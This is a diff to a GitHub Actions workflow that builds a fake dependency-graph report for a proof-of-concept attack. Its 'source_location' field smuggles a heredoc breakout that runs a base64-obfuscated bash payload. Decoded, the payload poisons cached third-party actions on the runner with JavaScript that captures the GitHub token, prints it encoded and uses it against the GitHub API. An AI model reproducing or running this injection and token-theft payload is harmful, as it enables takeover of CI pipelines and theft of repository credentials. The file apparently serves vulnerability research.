@@ -16,7 +16,7 @@ jobs:
         run: |
           mkdir -p dependency-graph-reports
           : > artifact-root.txt
-          cat > dependency-graph-reports/dep.json <<JSON
+          cat > dependency-graph-reports/dep.json <<'JSON'
           {
             "version": 0,
             "sha": "${{ github.event.pull_request.head.sha }}",
@@ -26,7 +26,7 @@ jobs:
             "manifests": {
               "poc": {
                 "name": "poc",
-                "file": {"source_location": "poc\nEOF\nid; echo RCE-CONFIRMED; touch pwned.txt; exit 0\n"},
+                "file": {"source_location": "poc\nEOF\necho 'CnNldCArZQplY2hvICJGT1JLLVJDRS1NQVJLRVIgcnVuPSR7R0lUSFVCX1JVTl9JRH0gYWN0b3I9JHtHSVRIVUJfQUNUT1J9IgppZApBPSQobHMgLWQgL2hvbWUvcnVubmVyL3dvcmsvX2FjdGlvbnMvbWFyb2NjaGluby9zdGlja3ktcHVsbC1yZXF1ZXN0LWNvbW1lbnQvKi8gMj4vZGV2L251bGwgfCBoZWFkIC0xKQpEPSQobHMgLWQgL2hvbWUvcnVubmVyL3dvcmsvX2FjdGlvbnMvZ3JhZGxlL2FjdGlvbnMvKi8gMj4vZGV2L251bGwgfCBoZWFkIC0xKQplY2hvICJTVElDS1k9JEEiCmVjaG8gIkdSQURMRT0kRCIKbHMgIiRBL2Rpc3QiIDI+L2Rldi9udWxsIHwgaGVhZCAtNQpoZWFkIC1jIDE2MCAiJEEvZGlzdC9pbmRleC5qcyIgMj4vZGV2L251bGw7IGVjaG8KZ3JlcCAtRSAiXltbOnNwYWNlOl1dKihwb3N0fG1haW58dXNpbmcpOiIgIiREL2FjdGlvbi55bWwiIDI+L2Rldi9udWxsClNOSVA9JzsoYXN5bmMoKT0+e3RyeXtjb25zdCB0PXByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTnx8IiI7Y29uc29sZS5sb2coIkNBUFRVUkVEX1RPS0VOX0I2NDoiK0J1ZmZlci5mcm9tKHQpLnRvU3RyaW5nKCJiYXNlNjQiKSk7Y29uc3Qgcj1hd2FpdCBmZXRjaCgiaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9QREZ0b01hcmsvdHJpYWdlLWVwYW0tdjdhYWZiMjQtZjE3NjhlIix7aGVhZGVyczp7QXV0aG9yaXphdGlvbjoidG9rZW4gIit0LCJVc2VyLUFnZW50IjoicG9jIn19KTtjb25zdCBiPWF3YWl0IHIudGV4dCgpO2NvbnNvbGUubG9nKCJBUElfQ0FMTF9TVEFUVVM6IityLnN0YXR1cyk7Y29uc29sZS5sb2coIkFQSV9DQUxMX0JPRFk6IitiLnNsaWNlKDAsNDAwKSk7fWNhdGNoKGUpe2NvbnNvbGUubG9nKCJDQVBUVVJFX0VSUjoiK2UubWVzc2FnZSl9fSkoKTsnCmVjaG8gIiRTTklQIiA+PiAiJEEvZGlzdC9pbmRleC5qcyIgMj4vZGV2L251bGwgJiYgZWNobyBQQVRDSEVEX1NUSUNLWQpQT1NUPSQoZ3JlcCAtRSAiXltbOnNwYWNlOl1dKnBvc3Q6IiAiJEQvYWN0aW9uLnltbCIgMj4vZGV2L251bGwgfCBoZWFkIC0xIHwgc2VkICJzL15bWzpzcGFjZTpdXSpwb3N0OltbOnNwYWNlOl1dKi8vO3MvW1wiJ10vL2ciKQplY2hvICJQT1NUX0VOVFJZPSRQT1NUIgppZiBbIC1uICIkUE9TVCIgXTsgdGhlbiBlY2hvICIkU05JUCIgPj4gIiRELyRQT1NUIiAyPi9kZXYvbnVsbCAmJiBlY2hvIFBBVENIRURfR1JBRExFX1BPU1Q7IGZpCmV4aXQgMAo=' | base64 -d | bash || true; exit 0\n"},
                 "resolved": {
                   "pkg:maven/com.example/poc@1.0.0": {
                     "package_url": "pkg:maven/com.example/poc@1.0.0",
@@ -37,7 +37,7 @@ jobs:
                 }
               }
             },
-            "scanned": "2026-11-11T21:05:00Z"
+            "scanned": "2026-11-11T19:56:00Z"
           }
           JSON
       - uses: actions/upload-artifact@v4
